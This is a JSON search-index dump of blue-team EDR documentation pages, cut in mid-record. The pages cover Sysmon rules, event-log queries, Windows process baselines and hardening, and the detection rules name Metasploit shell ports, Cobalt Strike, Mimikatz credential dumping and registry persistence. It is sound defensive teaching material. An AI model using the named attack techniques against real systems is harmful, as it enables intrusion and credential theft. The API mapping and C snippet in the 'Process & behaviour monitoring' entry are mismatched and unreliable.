    "c": "Persistence and logging  WMI Subscription Monitoring  Detects malicious WMI event subscriptions (e.g., __EventFilter). Finds APT29 implants that use WMI for persistence. Script: Get - WmiObject - Namespace root \\ Subscription - Class __EventFilter Windows Event Forwarding (WEF)  Centralizes logs (Security, Sysmon, PowerShell Operational). Essential for threat hunting (e.g., detecting Invoke-Mimikatz). Deploy: wecutil qc / q",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "20561be3b2c68a35c1524cae73f77c89",
    "u": "https://edr.tymyrddin.dev/docs/windows/memory",
    "t": "Memory protection ",
    "c": "Memory protection  Credential Guard  Uses virtualization-based security (VBS) to isolate LSASS -> Prevents Mimikatz-style attacks (e.g., sekurlsa::logonpasswords). Enable: Enable - WindowsOptionalFeature - Online - FeatureName \"VirtualizationBasedSecurity\" - All Arbitrary Code Guard (ACG)  Blocks non-signed code execution in memory -> Stops PowerShell exploits and shellcode injection. Deploy: Set - ProcessMitigation - PolicyFilePath . \\ ACG_Config . xml",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "39efa2572f406b7491906c5a2eace1c9",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/metasploit",
    "t": "Hunting metasploit ",
    "c": "Hunting metasploit  Metasploit is a commonly used exploit framework for penetration testing and red team operations. Metasploit can be used to easily run exploits on a machine and connect back to a meterpreter shell. To begin hunting for it, look for network connections that originate from suspicious ports such as 4444 and 5555. By default, Metasploit uses port 4444. If there is a connection to any IP known or unknown it should be investigated. To start an investigation, look at packet captures from the date of the log to begin looking for further information about the adversary. Also look for suspicious processes created. This method of hunting can be applied to other various RATs and C2 beacons. Network Connections config  Modify the Ion-Security configuration to detect the creation of new network connections. Use event ID 3 along with the destination port to identify active connections specifically connections on port 4444 and 5555 . <RuleGroup name=\"\" groupRelation=\"or\"> <NetworkConnect onmatch=\"include\"> <DestinationPort condition=\"is\">4444</DestinationPort> <DestinationPort condition=\"is\">5555</DestinationPort> </NetworkConnect> </RuleGroup> Metasploit payload dropped  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Hunting_Metasploit.evtx in Event Viewer to view a basic Metasploit payload being dropped onto the machine. Once we identify the event it can give us some important information we can use for further investigation like the ProcessID and Image . Hunting for Open Ports with PowerShell  Use the same XPath queries as used in the rule to filter out events from NetworkConnect with DestinationPort . Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name=\"DestinationPort\"] and */EventData/Data=4444' Resources  ion-storm / sysmon-config Malware Common Ports Spreadsheet",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "fed04063eab8562bd20eee90a22eea51",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/persistence",
    "t": "Hunting persistence ",
    "c": "Hunting persistence  Persistence is used by attackers to maintain access to a machine once it is compromised. There is a multitude of ways for an attacker to gain persistence on a machine. We will be focusing on registry modification as well as startup scripts. We can hunt persistence with Sysmon by looking for File Creation events as well as Registry Modification events. Startup persistence config  Use the SwiftOnSecurity detections for a file being placed in the \\Startup\\ or \\Start Menu directories. <RuleGroup name=\"\" groupRelation=\"or\"> <FileCreate onmatch=\"include\"> <TargetFilename name=\"T1023\" condition=\"contains\">\\Start Menu</TargetFilename> <TargetFilename name=\"T1165\" condition=\"contains\">\\Startup\\</TargetFilename> </FileCreate> </RuleGroup> Malicious EXE into the Startup folder  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\T1023.evtx in Event Viewer to view a live attack on the machine that involves persistence by adding a malicious EXE into the Startup folder. The event shows persist.exe placed in the Startup folder. Threat Actors will almost never make it this obvious but any changes to the Start Menu should be investigated. Adjust the configuration file to be more granular and create alerts past just the File Created tag. Another option is to filter by the Rule Name T1023. Once suspicious binary or application has been identified, begin an investigation on the directory. Registry Key Persistence config  Another SwiftOnSecurity detection, now for a registry modification that adjusts for a script inside CurrentVersion\\Windows\\Run and other registry locations. <RuleGroup name=\"\" groupRelation=\"or\"> <RegistryEvent onmatch=\"include\"> <TargetObject name=\"T1060,RunKey\" condition=\"contains\">CurrentVersion\\Run</TargetObject> <TargetObject name=\"T1484\" condition=\"contains\">Group Policy\\Scripts</TargetObject> <TargetObject name=\"T1060\" condition=\"contains\">CurrentVersion\\Windows\\Run</TargetObject> </RegistryEvent> </RuleGroup> Modified registry  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\T1060.evtx in Event Viewer to view an attack where the registry was modified to gain persistence. The event shows the registry was modified and malicious.exe was added to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence , and that the exe can be found at %windir%\\System32\\malicious.exe . Filtering by the RuleName T1060 makes finding the anomaly easier. If we wanted to investigate this anomaly we would need to look at the registry as well as the file location itself. Resources  MITRE ATT&CK T1547 MITRE ATT&CK T1112",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "e9481aa8f4ffadc55e5e597b6e0befce",
    "u": "https://edr.tymyrddin.dev/docs/wlogs/events",
    "t": "Event logs ",
    "c": "Event logs  The Windows Event Logs are not text files that can be viewed using a text editor. The raw data can be translated into XML using the Windows API. The events in these log files are stored in a proprietary binary format with a .evt or .evtx extension. The log files with the .evtx file extension typically reside in C:\\Windows\\System32\\winevt\\Logs . Elements  System Logs: Records events associated with the Operating System segments. They may include information about hardware changes, device drivers, system changes, and other activities related to the device. Security Logs: Records events connected to logon and logoff activities on a device. The system’s audit policy specifies the events. The logs are an excellent source for analysts to investigate attempted or successful unauthorized activity. Application Logs: Records events related to applications installed on a system. The main pieces of information include application errors, events, and warnings. Directory Service Events: Active Directory changes and activities are recorded in these logs, mainly on domain controllers. File Replication Service Events: DNS Event Logs: DNS servers use these logs to record domain events and to map out Custom Logs: Events are logged by applications that require custom data storage. This allows applications to control the log size or attach other parameters, such as ACLs, for security purposes. There are three main ways of accessing these event logs within a Windows system: Event Viewer (GUI-based application) Wevtutil.exe (command-line tool) Get-WinEvent (PowerShell cmdlet) Using the GUI method  Right-click on Start and select Event Viewer. Select the proper log: Applications and Services Logs -> Microsoft -> Windows -> Powershell -> Operational What is the Event ID for the first event? Scroll all the way down: Answer: 40961 Filter on Event ID 4104. What was the 2nd command executed in the PowerShell session? Filter on Event ID 4104 and scroll all the way down. Answer: whoami What is the Task Category for Event ID 4104? Answer: Execute a Remote Command Analyse the Windows PowerShell log. What is the Task Category for Event ID 800? On the left-hand side, navigate to Applications and Service Logs -> Windows PowerShell (standalone log). Clicking on the log entry to see the events listed with Event ID 800. Answer: Pipeline Execution Details Using Wevtutil.exe  Per Microsoft, the wevtutil.exe tool “enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs.” How many log names are in the machine? PS C:\\Users\\Administrator> wevtutil.exe el | Measure-Object Answer: 1071 What event files would be read when using the query-events command? PS C:\\Users\\Administrator> wevtutil.exe qe /? Answer: event log,log file,structured query . What option would you use to provide a path to a log file? Answer: /lf:true What is the VALUE for /q ? Answer: XPATH query The questions below are based on this command: wevtutil qe Application /c:3 /rd:true /f:text What is the log name? PS C:\\Users\\Administrator> wevtutil qe Application /c:3 /rd:true /f:text Answer: Application What is the /rd option for? Answer: Event read direction What is the /c option for? Answer: Maximum number of events to read Using Get-WinEvent  What are the names of the logs related to OpenSSH? Get-WinEvent -ListLog * Answer: OpenSSH/Admin,OpenSSH/Operational Search for PowerShell . What is the name of the 3rd log provider? Get-WinEvent -ListProvider *PowerShell* Answer: Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager Use Microsoft-Windows-PowerShell as the log provider. How many event ids are displayed for this event provider? (Get-WinEvent -ListProvider Microsoft-Windows-PowerShell).Events | Format-Table Id, Description Answer: 192 How do you specify the number of events to display? Answer: -MaxEvents When using the FilterHashtable parameter and filtering by level, what is the value for Informational? Answer: 4 Resources  Get-WinEvent Measure-Object",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "e57fd8c5934e9352166d176ca6b5191f",
    "u": "https://edr.tymyrddin.dev/docs/wlogs/xpath",
    "t": "XPath queries ",
    "c": "XPath queries  The W3C created XPath, or XML Path Language in full, to provide a standard syntax and semantics for addressing parts of an XML document and manipulating strings, numbers, and booleans. The Windows Event Log supports a subset of XPath 1.0. Using Get-WinEvent and XPath , what is the query to find WLMS events with a System Time of 2020-12-15T01:09:08.940277500Z ? Answer: Get-WinEvent -LogName Application -FilterXPath '*/System/Provider[@Name=\"WLMS\"] and */System/TimeCreated[@Name=\"SystemTime\"]=\"2020-12-15T01:09:08.940277500Z\"' Using Get-WinEvent and XPath , what is the query to find a user named Sam with a Logon Event ID of 4720 ? Answer: Get-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name=\"TargetUserName\"]=\"Sam\" and */System/EventID=4720' How many results are returned? Answer: 2 What is the Message? Answer: A user account was created Still working with Sam as the user, what time was Event ID 4724 recorded? MM/DD/YYYY H:MM:SS [AM/PM] Get-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name=\"TargetUserName\"]=\"Sam\" and */System/EventID=4724' Answer: 12/17/2020 1:57:14 PM What is the Provider Name? Answer: Microsoft-Windows-Security-Auditing Resources  XML Path Language (XPath) Version 1.0",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "e0105002ebeb36ff16571331af03a3bd",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/events",
    "t": "Event IDs ",
    "c": "Event IDs  Sysmon gathers detailed and high-quality logs as well as event tracing that assists in identifying anomalies in the environment. Sysmon is most commonly used in conjunction with security information and event management (SIEM) system or other log parsing solutions that aggregate, filter, and visualize events. When installed on an endpoint, Sysmon will start early in the Windows boot process. In an ideal scenario, the events would be forwarded to a SIEM for further analysis. Sysmon includes 29 different types of Event IDs, all of which can be used within the config to specify how the events should be handled and analysed. Event ID 1: Process Creation  This event will look for any processes that have been created. You can use this to look for known suspicious processes or processes with typos that would be considered an anomaly. This event will use the CommandLine and Image XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <ProcessCreate onmatch=\"exclude\"> <CommandLine condition=\"is\">C:\\Windows\\system32\\svchost.exe -k appmodel -p -s camsvc</CommandLine> </ProcessCreate> </RuleGroup> The above code snippet is specifying the Event ID to pull from as well as what condition to look for. In this case, it is excluding the svchost.exe process from the event logs. Event ID 3: Network Connection  The network connection event will look for events that occur remotely. This will include files and sources of suspicious binaries as well as opened ports. This event will use the Image and DestinationPort XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <NetworkConnect onmatch=\"include\"> <Image condition=\"image\">nmap.exe</Image> <DestinationPort name=\"Alert,Metasploit\" condition=\"is\">4444</DestinationPort> </NetworkConnect> </RuleGroup> The above code snippet includes two ways to identify suspicious network connection activity. The first way will identify files transmitted over open ports. In this case, we are specifically looking for nmap.exe which will then be reflected within the event logs. The second method identifies open ports and specifically port 4444 which is commonly used with Metasploit. If the condition is met an event will be created and ideally trigger an alert for the SOC to further investigate. Event ID 7: Image Loaded  This event will look for DLLs loaded by processes, which is useful when hunting for DLL Injection and DLL Hijacking attacks. It is recommended to exercise caution when using this Event ID as it causes a high system load. This event will use the Image, Signed, ImageLoaded, and Signature XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <ImageLoad onmatch=\"include\"> <ImageLoaded condition=\"contains\">\\Temp\\</ImageLoaded> </ImageLoad> </RuleGroup> The above code snippet will look for any DLLs that have been loaded within the \\Temp\\ directory. If a DLL is loaded within this directory it can be considered an anomaly and should be further investigateded. Event ID 8: CreateRemoteThread  The CreateRemoteThread Event ID will monitor for processes injecting code into other processes. The CreateRemoteThread function is used for legitimate tasks and applications. However, it could be used by malware to hide malicious activity. This event will use the SourceImage, TargetImage, StartAddress, and StartFunction XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <CreateRemoteThread onmatch=\"include\"> <StartAddress name=\"Alert,Cobalt Strike\" condition=\"end with\">0B80</StartAddress> <SourceImage condition=\"contains\">\\</SourceImage> </CreateRemoteThread> </RuleGroup> The above code snippet shows two ways of monitoring for CreateRemoteThread. The first method will look at the memory address for a specific ending condition which could be an indicator of a Cobalt Strike beacon. The second method will look for injected processes that do not have a parent process. This should be considered an anomaly and require further investigation. Event ID 11: File Created  This event ID is will log events when files are created or overwritten the endpoint. This could be used to identify file names and signatures of files that are written to disk. This event uses TargetFilename XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <FileCreate onmatch=\"include\"> <TargetFilename name=\"Alert,Ransomware\" condition=\"contains\">HELP_TO_SAVE_FILES</TargetFilename> </FileCreate> </RuleGroup> The above code snippet is an example of a ransomware event monitor. This is just one example of a variety of different ways you can utilize Event ID 11. Event ID 12/13/14: Registry Event  This event looks for changes or modifications to the registry. Malicious activity from the registry can include persistence and credential abuse. This event uses TargetObject XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <RegistryEvent onmatch=\"include\"> <TargetObject name=\"T1484\" condition=\"contains\">Windows\\System\\Scripts</TargetObject> </RegistryEvent> </RuleGroup> The above code snippet will look for registry objects that are in the “Windows\\System\\Scripts” directory as this is a common directory for adversaries to place scripts to establish persistence. Event ID 15: FileCreateStreamHash  This event will look for any files created in an alternate data stream. This is a common technique used by adversaries to hide malware. This event uses TargetFilename XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <FileCreateStreamHash onmatch=\"include\"> <TargetFilename condition=\"end with\">.hta</TargetFilename> </FileCreateStreamHash> </RuleGroup> The above code snippet will look for files with the .hta extension that have been placed within an alternate data stream. Event ID 22: DNS Event  This event will log all DNS queries and events for analysis. The most common way to deal with these events is to exclude all trusted domains that you know will be very common “noise” in your environment. Once you get rid of the noise you can then look for DNS anomalies. This event uses QueryName XML tags. <RuleGroup name=\"\" groupRelation=\"or\"> <DnsQuery onmatch=\"exclude\"> <QueryName condition=\"end with\">.microsoft.com</QueryName> </DnsQuery> </RuleGroup> The above code snippet will get exclude any DNS events with the .microsoft.com query. This will get rid of the noise that you see within the environment. Starting Sysmon  In PowerShell or Command Prompt as Administrator: C:\\Users\\THM-Analyst\\Desktop\\Tools\\Sysmon>Sysmon.exe -accepteula -i ..\\Configuration\\swift.xml The event log is located under Applications and Services Logs/Microsoft/Windows/Sysmon/Operational . Resources  Sysmon v14.12 sysmon-config | A Sysmon configuration file for everybody to fork ion-storm / sysmon-config",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2a2333a04746cbfc8efbffb49dc93af8",
    "u": "https://edr.tymyrddin.dev/docs/sysinternals/process",
    "t": "Process utilities ",
    "c": "Process utilities  Autoruns  “This utility, which has the most comprehensive knowledge of auto-starting locations of any startup monitor, shows you what programs are configured to run during system bootup or login, and when you start various built-in Windows applications like Internet Explorer, Explorer and media players. These programs and drivers include ones in your startup folder, Run, RunOnce, and other Registry keys. Autoruns reports Explorer shell extensions, toolbars, browser helper objects, Winlogon notifications, auto-start services, and much more. Autoruns goes way beyond other autostart utilities.” (official definition) This is a good tool to search for any malicious entries created in the local machine to establish Persistence. Questions  Run Autoruns and inspect what are the new entries in the Image Hijacks tab compared to the screenshot earlier. Earlier Now What entry was updated? Answer: taskmgr.exe What is the updated value? Answer: c:\\tools\\sysint\\procexp.exe ProcDump  “ ProcDump is a command-line utility whose primary purpose is monitoring an application for CPU spikes and generating crash dumps during a spike that an administrator or developer can use to determine the cause of the spike.” (official definition) Process Explorer  “The Process Explorer display consists of two sub-windows. The top window always shows a list of the currently active processes, including the names of their owning accounts, whereas the information displayed in the bottom window depends on the mode that Process Explorer is in: if it is in handle mode you’ll see the handles that the process selected in the top window has opened; if Process Explorer is in DLL mode you’ll see the DLLs and memory-mapped files that the process has loaded.” (official definition) There is an option within ProcExp to Verify Signatures. Once enabled, it shows up as a column within the Process view. Other options to note include Run at Logon and Replace Task Manager. Process Monitor  “Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity. It combines the features of two legacy Sysinternals utilities, Filemon and Regmon, and adds an extensive list of enhancements including rich and non-destructive filtering, comprehensive event properties such as session IDs and usernames, reliable process information, full thread stacks with integrated symbol support for each operation, simultaneous logging to a file, and much more. Its uniquely powerful features will make Process Monitor a core utility in your system troubleshooting and malware hunting toolkit.” (official definition) The Ultimate Guide to Procmon -> PsExec  “PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec’s most powerful uses include launching interactive command-prompts on remote systems and remote-enabling tools like IpConfig that otherwise do not have the ability to show information about remote systems.” (official definition) PsExec is another tool that is utilized by adversaries. This tool is associated with MITRE techniques T1570 (Lateral Tool Transfer) , T1021.002 (Remote Services: SMB/Windows Admin Shares) , and T1569.002 (System Services: Service Execution) in MITRE ID S0029 . Everything You Wanted to know  Psexec ->",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "22d280b4ac6fac804089893e09a8d243",
    "u": "https://edr.tymyrddin.dev/docs/core/smss",
    "t": "smss.exe ",
    "c": "smss.exe  smss.exe (Session Manager Subsystem alias Windows Session Manager), is responsible for creating new sessions. It is the first user-mode process started by the kernel. This process starts the kernel and user modes of the Windows subsystem. This subsystem includes win32k.sys (kernel mode), winsrv.dll (user mode), and csrss.exe (user mode). smss.exe starts csrss.exe (Windows subsystem) and wininit.exe in Session 0, an isolated Windows session for the operating system, and csrss.exe and winlogon.exe for Session 1, which is the user session. The first child instance creates child instances in new sessions, done by smss.exe copying itself into the new session and self-terminating. Any other subsystem listed in the Required value of HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Subsystems is also launched. smss.exe is also responsible for creating environment variables and virtual memory paging files. Normal  Image Path: %SystemRoot%\\System32\\smss.exe Parent Process: System Number of Instances: One master instance and child instance per session. The child instance exits after creating the session. User Account: Local System Start Time: Within seconds of boot time for the master instance Unusual  A different parent process other than System (PID 4 ) The image path is different from C:\\Windows\\System32 More than one running process. (children self-terminate and exit after each new session) The running User is not the SYSTEM user Unexpected registry entries for Subsystem Resources  Architecture of Windows NT Session Manager Subsystem",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "3f94db55f2a9e2e90b15e5bc166d66a5",
    "u": "https://edr.tymyrddin.dev/docs/core/winlogon",
    "t": "winlogon.exe ",
    "c": "winlogon.exe  The Windows Logon, winlogon.exe , is responsible for handling the Secure Attention Sequence (SAS). It is the ALT+CTRL+DELETE key combination users press to enter their username & password. This process is also responsible for loading the user profile. It loads the user’s NTUSER.DAT into HKCU , and userinit.exe loads the user’s shell. And it is also responsible for locking the screen and running the user’s screensaver, among other functions. smss.exe launches this process along with a copy of csrss.exe within Session 1. Normal  Image Path: %SystemRoot%\\System32\\winlogon.exe Parent Process: Created by an instance of smss.exe that exits, so analysis tools usually do not provide the parent process name. Number of Instances: One or more User Account: Local System Start Time: Within seconds of boot time for the first instance (for Session 1). Additional instances occur as new sessions are created, typically through Remote Desktop or Fast User Switching logons. Unusual  An actual parent process. ( smss.exe calls this process and self-terminates) Image file path other than C:\\Windows\\System32 Subtle misspellings to hide rogue processes in plain sight Not running as SYSTEM Shell value in the registry other than explorer.exe Resources  Winlogon Userinit",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d2c48d5fbecd01da1c30e3725b87ec05",
    "u": "https://edr.tymyrddin.dev/docs/core/services",
    "t": "services.exe ",
    "c": "services.exe  The next process is the Service Control Manager (SCM) or services.exe . Its primary responsibility is to handle system services: loading services, interacting with services and starting or ending services. It maintains a database that can be queried using a Windows built-in utility, sc.exe . Information regarding services is stored in the registry, HKLM\\System\\CurrentControlSet\\Services . This process also loads device drivers marked as auto-start into memory. When a user logs into a machine successfully, this process is responsible for setting the value of the Last Known Good control set (Last Known Good Configuration), HKLM\\System\\Select\\LastKnownGood , to that of the CurrentControlSet . This process is the parent to several other key processes: svchost.exe , spoolsv.exe , msmpeng.exe , and dllhost.exe , to name a few. Normal  Image Path: %SystemRoot%\\System32\\services.exe Parent Process: wininit.exe Number of Instances: One User Account: Local System Start Time: Within seconds of boot time Unusual  A parent process other than wininit.exe Image file path other than C:\\Windows\\System32 Subtle misspellings to hide rogue processes in plain sight Multiple running instances Not running as SYSTEM Resources  Service Control Manager",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "574d0dd2c17ef5da62bea4be21ee2dc4",
    "u": "https://edr.tymyrddin.dev/docs/linux/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Endpoint Detection and Response (EDR) for Linux monitors system activity in real time, detecting and responding to threats like malware, unauthorized access, and suspicious behaviour. It leverages kernel-level visibility (eBPF, auditd) and open-source tools (Falco, Osquery) to secure servers, cloud workloads, and containers. Why?  Threats are evolving: Attackers increasingly target Linux systems (cloud servers, IoT, DevOps pipelines). Limited native security: Unlike Windows/macOS, Linux lacks built-in EDR capabilities. Critical for compliance: Required for frameworks like CIS, NIST, and PCI-DSS. How?  Kernel-level monitoring Filesystem integrity Container security Threat Hunting with Open Source",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "f3621585f52d032626b8352ede83db92",
    "u": "https://edr.tymyrddin.dev/docs/windows/process",
    "t": "Process & behaviour monitoring ",
    "c": "Process & behaviour monitoring  Kernel Callbacks  Hooks into Windows kernel (via ETW or MiniFilter) to monitor: Process creation (PsSetCreateProcessNotifyRoutineEx) Thread injection (PsSetLoadImageNotifyRoutine) DLL loading (NtCreateThreadEx) Detects: Process hollowing (malware spawning svchost.exe then hollowing it) Reflective DLL injection (Cobalt Strike) Tools: Microsoft Defender for Endpoint (uses ETW) Custom drivers (e.g., Sysmon with SwiftOnSecurity configs) User-Mode hooking  Injects hooks into APIs like: CreateRemoteThread (blocks thread injection) WriteProcessMemory (stops code injection) Catches fileless attacks (PowerShell scripts, WMI persistence). Example: // Detecting thread injection if ( lpStartAddress == \"C:\\Windows\\System32 \\a msi.dll\" ) { BlockExecution (); }",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "c80a7b7fc2a58c9daffcc3a459de4049",
    "u": "https://edr.tymyrddin.dev/docs/windows/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  A security system for Windows that detects, investigates, and mitigates threats like ransomware, credential theft, and LOLBins (Living-Off-the-Land Binaries). It combines Microsoft Defender for Endpoint, Attack Surface Reduction (ASR) rules, and behavioral analytics to stop advanced attacks. Why?  #1 targeted OS: 90% of malware attacks focus on Windows. Native tools aren’t enough: Defender misses fileless attacks and LOLBins. Regulatory demands: Needed for HIPAA, GDPR, and FedRAMP compliance. How?  Process & behaviour monitoring Memory protection Attack Surface Reduction (ASR) Network threat detection Persistence and logging Response techniques",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "051f87f2ecbd1865a00f81212dea7787",
    "u": "https://edr.tymyrddin.dev/docs/sysinternals/security",
    "t": "Security utilities ",
    "c": "Security utilities  Sysmon  “System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log. It provides detailed information about process creations, network connections, and changes to file creation time. By collecting the events it generates using Windows Event Collection or SIEM agents and subsequently analyzing them, you can identify malicious or anomalous activity and understand how intruders and malware operate on your network.” (official definition)",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "ff212fa2663bede17b01f6be9531a87e",
    "u": "https://edr.tymyrddin.dev/docs/windows/asr",
    "t": "Attack Surface Reduction (ASR) ",
    "c": "Attack Surface Reduction (ASR)  ASR rules  Native Windows Defender rules to block: Office macro execution (D4F940AB-401B-4EFC-AADC-AD5F3C50688A) LOLBins abuse (5BEB7EFE-FD9A-4556-801D-275E5FFC04CC) Stops Emotet (macros) and Living-off-the-Land attacks. Enable: Set - MpPreference - AttackSurfaceReductionRules_Ids < RuleGUID > - AttackSurfaceReductionRules_Actions Enabled WDAC (Windows Defender Application Control)  Allowlists signed executables (CI/CD pipelines only) to block unsigned malware (e.g., ransomware droppers). Deploy: ConvertFrom - CIPolicy - XmlFilePath . \\ Policy . xml - BinaryFilePath . \\ Policy . bin",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "475ebbf0bddbba944a4b1e53521d0d12",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/evasion",
    "t": "Detecting evasion techniques ",
    "c": "Detecting evasion techniques  There are a number of evasion techniques used by malware authors to evade both antivirus and detections. Some examples of evasion techniques are Alternate Data Streams, Injections, Masquerading, Packing/Compression, Recompiling, Obfuscation, and Anti-Reversing Techniques. Alternate Data Streams are used by malware to hide its files from normal inspection by saving the file in a different stream apart from $DATA . Sysmon comes with an event ID to detect newly created and accessed streams allowing us to quickly detect and hunt malware that uses ADS. Injection techniques come in different types: Thread Hijacking, PE Injection, DLL Injection, and more. Here, the focus is on DLL Injection and back-dooring DLLs. This is done by taking an already used DLL that is used by an application and overwriting or including the malicious code within the DLL. Alternate Data Streams config  The first technique we will be looking at is hiding files using alternate data streams using Event ID 15. Event ID 15 will hash and log any NTFS Streams that are included within the Sysmon configuration file. This will allow us to hunt for malware that evades detections using ADS. To aid in hunting ADS we will be using the SwiftOnSecurity Sysmon configuration file. The code snippet below will hunt for files in the Temp and Startup folder as well as .hta and .bat extension. <RuleGroup name=\"\" groupRelation=\"or\"> <FileCreateStreamHash onmatch=\"include\"> <TargetFilename condition=\"contains\">Downloads</TargetFilename> <TargetFilename condition=\"contains\">Temp\\7z</TargetFilename> <TargetFilename condition=\"ends with\">.hta</TargetFilename> <TargetFilename condition=\"ends with\">.bat</TargetFilename> </FileCreateStreamHash> </RuleGroup> Files hiding in ADS  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Hunting_ADS.evtx in Event Viewer to view hidden files using an alternate data stream. The event shows the location of the file name as well as the contents of the file. Listing Data Streams: C:\\\\Users\\\\THM-Threat>dir /r Remote Threads config  Adversaries also commonly use remote threads to evade detections in combination with other techniques. Remote threads are created using the Windows API CreateRemoteThread and can be accessed using OpenThread and ResumeThread . This is used in multiple evasion techniques including DLL Injection, Thread Hijacking, and Process Hollowing. Use the Sysmon event ID 8 from the SwiftOnSecurity configuration file. The code snippet excludes common remote threads without including any specific attributes. This allows for a more open and precise event rule. <RuleGroup name=\"\" groupRelation=\"or\"> <CreateRemoteThread onmatch=\"exclude\"> <SourceImage condition=\"is\">C:\\Windows\\system32\\svchost.exe</SourceImage> <TargetImage condition=\"is\">C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</TargetImage> </CreateRemoteThread> </RuleGroup> Process hollowing notepad.exe  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Detecting_RemoteThreads.evtx in Event Viewer to observe a Process Hollowing attack that abuses the notepad.exe process. The event shows powershell.exe creating a remote thread and accessing notepad.exe . Detecting evasion techniques with PowerShell  Detecting remote thread creation: Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=8' Resources  MITRE ATT&CK T1564 MITRE ATT&CK T1055",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "c64e4d8196fc7830aa9a4afc40ee0f92",
    "u": "https://edr.tymyrddin.dev/docs/macos/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  A security layer for macOS that detects and prevents malware, unauthorized executions, and data exfiltration. It uses Apple’s Endpoint Security Framework (ESF), System Integrity Protection (SIP), and XProtect to monitor processes, file changes, and network activity. Why?  Macs are high-value targets: Attacks rose 300%+ in 2023 (Malwarebytes). Apple’s defenses aren’t enough: SIP/XProtect miss fileless attacks, adware, and zero-days. Organisational risk: Macs in organisational networks need zero-trust controls. How?  Process monitoring Memory protection Behavioural detection Network hardening",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "11ede6a6b7d4f3c9fdbd372a7da60b50",
    "u": "https://edr.tymyrddin.dev/docs/core/lsass",
    "t": "lsass.exe ",
    "c": "lsass.exe  Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. It also writes to the Windows Security Log. It creates security tokens for SAM (Security Account Manager), AD (Active Directory), and NETLOGON. It uses authentication packages specified in HKLM\\System\\CurrentControlSet\\Control\\Lsa . Lsass.exe is another process adversaries target. Common tools such as mimikatz are used to dump credentials, or adversaries mimic this process to hide in plain sight. Again, they do this by either naming their malware by this process name or simply misspelling the malware slightly. Normal  Image Path: %SystemRoot%\\System32\\lsass.exe Parent Process: wininit.exe Number of Instances: One User Account: Local System Start Time: Within seconds of boot time Unusual  A parent process other than wininit.exe Image file path other than C:\\Windows\\System32 Subtle misspellings to hide rogue processes in plain sight Multiple running instances Not running as SYSTEM Resources  How LSASS is maliciously used and additional features that Microsoft has put into place to prevent these attacks",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2e4b15734fc98c90cb9bb7d2492adc72",
    "u": "https://dfir.tymyrddin.dev/",
    "t": "Digital forensics and incident response (DFIR) ",
    "c": "Digital forensics and incident response (DFIR)  DFIR integrates Digital forensics, the investigation of cyberthreats to gather digital evidence for litigating criminals; and incident response, the detection and mitigation of cyberattacks in progress. Though DFIR is traditionally a reactive security function, tooling and advanced technology such as artificial intelligence (AI) and machine learning (ML), have enabled some organisations to leverage DFIR activity to influence and inform preventative measures. In such cases, making it a component within a proactive security strategy. Testlab Ventoy Kali SIFT with REMnux CAINE SquashFS DFIR tools Mobile tools RE tools Notes Introduction Forensic choreographies Network forensics Preparing for acquisition Image acquisition Android acquisition iOS acquisition Accessing images Windows analysis Linux analysis macOS analysis Mobile analysis iOS analysis Android analysis Resources TryHackMe rooms Introduction A Windows server Organisation X desktop Standard Collector Analysis (Redline) IOC Search Collector (Redline) IOC Search Collector Analysis (Redline) Endpoint investigation (Redline) Leaking private company data (again) (Autopsy) Windows 10 disk image (Autopsy) 